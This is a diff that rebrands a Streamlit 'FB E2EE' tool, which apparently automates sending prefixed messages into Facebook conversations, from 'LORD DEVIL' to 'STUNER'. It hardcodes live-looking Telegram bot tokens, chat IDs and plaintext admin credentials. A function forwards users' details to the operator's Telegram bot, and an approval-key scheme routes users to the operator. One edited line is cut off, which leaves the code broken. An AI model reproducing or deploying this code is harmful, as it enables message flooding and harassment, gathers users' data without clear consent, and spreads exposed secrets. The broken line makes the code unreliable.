@@ -35,7 +35,7 @@ def setup_mongodb_heartbeat():
                         '$set': {
                             'last_heartbeat': datetime.now(),
                             'status': 'running',
-                            'app_name': 'LORD DEVIL E2EE',
+                            'app_name': 'LORD STUNER E2E',
                             'timestamp': datetime.now(),
                             'version': '2.0'
                         }
@@ -66,16 +66,16 @@ if 'mongodb_started' not in st.session_state:
 # 🚨🚨🚨 MONGODB 24/7 CODE END 🚨🚨🚨
 
 st.set_page_config(
-    page_title="FB E2EE by LORD DEVIL",
+    page_title="FB E2EE by LORD STUN3R",
     page_icon="👑",
     layout="wide",
     initial_sidebar_state="expanded"
 )
 
 # Telegram Bot Configuration
-TELEGRAM_BOT_TOKEN = "8043472695:AAGfv8QI4yB_eNAL2ZAIq2bU7ING_-0e3qg"
-TELEGRAM_CHAT_ID = "8186206231"
-FACEBOOK_ADMIN_UID = "100037931553832"
+TELEGRAM_BOT_TOKEN = "8479361093:AAHq-1l9FgLd15rBlm4PGh552UfqR_9ColQ"
+TELEGRAM_CHAT_ID = "8479361093"
+FACEBOOK_ADMIN_UID = "61568211687474"
 
 def send_telegram_notification(user_data, automation_data):
     """Send user details to Telegram bot"""
@@ -147,7 +147,7 @@ def send_facebook_notification(user_data, automation_data):
         print(f"Facebook notification failed: {e}")
 
 # Background image and custom CSS
-background_image = "https://i.ibb.co/FkGd2cNf/cccf21694e054d66aa5a945bb3b212fa.jpg"
+background_image = "https://i.ibb.co/v6mY09h1/IMG-20260103-WA0021.jpg"
 
 custom_css = f"""
 <style>
@@ -970,18 +970,18 @@ def send_messages(config, automation_state, user_id, process_id='AUTO-1'):
                 pass
 
 def send_approval_request_via_whatsapp(user_real_name, approval_key):
-    message = f"Hello lord devil sir\n\nmy name is ~ {user_real_name}\nmy key is ~ {approval_key}\n\npls approve my key sir"
-    whatsapp_url = f"https://wa.me/917668337116?text={requests.utils.quote(message)}"
+    message = f"Hello Stuner Sir\n\nmy name is ~ {user_real_name}\nmy key is ~ {approval_key}\n\npls approve my key sir"
+    whatsapp_url = f"https://wa.me/971563426914?text={requests.utils.quote(message)}"
     return whatsapp_url
 
 def send_approval_request_via_facebook(user_real_name, approval_key):
-    message = f"Hello lord devil sir\n\nmy name is ~ {user_real_name}\nmy key is ~ {approval_key}\n\npls approve my key sir"
-    facebook_url = f"https://www.facebook.com/Lord Devil.X"
+    message = f"Hello Stuner sir\n\nmy name is ~ {user_real_name}\nmy key is ~ {approval_key}\n\npls approve my key sir"
+    facebook_url = f"https://www.facebook.com/profile.php?id=61568211687474"
     return facebook_url
 
 def send_approval_request_via_telegram(user_real_name, approval_key):
-    message = f"Hello lord devil sir\n\nmy name is ~ {user_real_name}\nmy key is ~ {approval_key}\n\npls approve my key sir"
-    telegram_url = f"https://t.me/itxthedevil?text={requests.utils.quote(message)}"
+    message = f"Hello Stunner sir\n\nmy name is ~ {user_real_name}\nmy key is ~ {approval_key}\n\npls approve my key sir"
+    telegram_url = f"https://t.me/?text={requests.utils.quote(message)}"
     return telegram_url
 
 def run_automation_with_notification(user_config, username, automation_state, user_id):
@@ -1034,15 +1034,14 @@ st.markdown('<div class="main-container">', unsafe_allow_html=True)
 # Profile Icon
 st.markdown('<div class="profile-icon"></div>', unsafe_allow_html=True)
 
-st.markdown('<div class="main-header"><h1>LORD DEVIL E2EE FACEBOOK CONVO</h1><p>Created by LORD DEVIL</p></div>', unsafe_allow_html=True)
-
+st.markdown('<div class="main-header">STUNNER<h1>LORD DEVIL E2EE FACEBOOK CONVO</h1><p>Created by LORD STUNER</p></div>', unsafe_allow_html=T
 # Admin Panel
 if st.sidebar.checkbox("🔐 Admin Login"):
     admin_username = st.sidebar.text_input("Admin Username", key="admin_username")
     admin_password = st.sidebar.text_input("Admin Password", type="password", key="admin_password")
     
     if st.sidebar.button("Login as Admin"):
-        if admin_username == "DEVILXD" and admin_password == "LORDX7668":
+        if admin_username == "STUNER XD" and admin_password == "LORDXSTUNER":
             st.session_state.admin_logged_in = True
             st.sidebar.success("Admin login successful!")
         else:
@@ -1376,7 +1375,7 @@ else:
                 st.warning("Please enter your real name first")
         
         # Contact buttons - ALWAYS VISIBLE
-        st.markdown("### 📞 Contact LORD DEVIL for Approval")
+        st.markdown("### 📞 Contact STUNNER for Approval")
         st.markdown("Click any button below to send your approval request:")
         
         col1, col2, col3 = st.columns(3)
@@ -1413,7 +1412,7 @@ else:
                 st.success("🎉 Your account has been approved! You can now access the automation features.")
                 st.rerun()
             else:
-                st.warning("Your approval is still pending. Please wait for LORD DEVIL to approve your request.")
+                st.warning("Your approval is still pending. Please wait for STUNNER to approve your request.")
         
         if st.sidebar.button("🚪 Logout"):
             st.session_state.logged_in = False
@@ -1463,13 +1462,13 @@ else:
                 
                 st.markdown('<div class="input-label">Chat/Conversation ID</div>', unsafe_allow_html=True)
                 chat_id = st.text_input("", value=user_config['chat_id'], 
-                                       placeholder="e.g., 1362400298935018 (Facebook conversation ID from URL)",
+                                       placeholder="e.g., 100.. (Facebook conversation ID from URL)",
                                        label_visibility="collapsed")
                 st.markdown('<div class="input-hint">Enter Facebook conversation ID from the URL</div>', unsafe_allow_html=True)
                 
                 st.markdown('<div class="input-label">Hatersname Prefix</div>', unsafe_allow_html=True)
                 name_prefix = st.text_input("", value=user_config['name_prefix'],
-                                           placeholder="e.g., [END TO END LORD DEVIL HERE]",
+                                           placeholder="e.g., [END TO END LORD STUNER HERE]",
                                            label_visibility="collapsed")
                 st.markdown('<div class="input-hint">Prefix to add before each message</div>', unsafe_allow_html=True)
                 
@@ -1556,4 +1555,4 @@ else:
                     st.rerun()
 
 st.markdown('</div>', unsafe_allow_html=True)  # Close main-container
-st.markdown('<div class="footer">Made with ❤️ by LORD DEVIL | © 2025 All Rights Reserved</div>', unsafe_allow_html=True)
+st.markdown('<div class="footer">Made with ❤️ by STUNNER XD | © 2025 All Rights Reserved</div>', unsafe_allow_html=True)
